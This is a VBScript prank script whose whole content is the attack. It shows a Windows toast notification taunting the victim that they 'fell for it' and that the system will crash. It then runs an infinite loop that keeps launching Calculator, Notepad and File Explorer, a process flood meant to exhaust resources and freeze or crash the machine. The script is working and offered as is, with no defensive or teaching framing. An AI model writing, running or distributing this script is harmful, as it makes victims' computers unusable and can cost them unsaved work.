Set objShell = CreateObject("WScript.Shell")

' Send a Windows Notification
objShell.Run "powershell -Command ""[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null; " & _
" $template = [Windows.UI.Notifications.ToastTemplateType]::ToastImageAndText02; " & _
" $toastXml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template); " & _
" $toastText = $toastXml.GetElementsByTagName('text'); " & _
" $toastText[0].AppendChild($toastXml.CreateTextNode('You really fell for it? Ready for your system to crash?')) > $null; " & _
" $toastText[1].AppendChild($toastXml.CreateTextNode('')) > $null; " & _
" $toast = [Windows.UI.Notifications.ToastNotification]::new($toastXml); " & _
" [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('MyScript').Show($toast)""", 0, True

' Wait for 5 seconds
WScript.Sleep 5000

' Infinite loop opening Calculator, Notepad, and File Explorer rapidly
Do
    objShell.Run "calc", 0  ' Open Calculator
    objShell.Run "notepad", 0  ' Open Notepad
    objShell.Run "explorer", 0  ' Open File Explorer
Loop
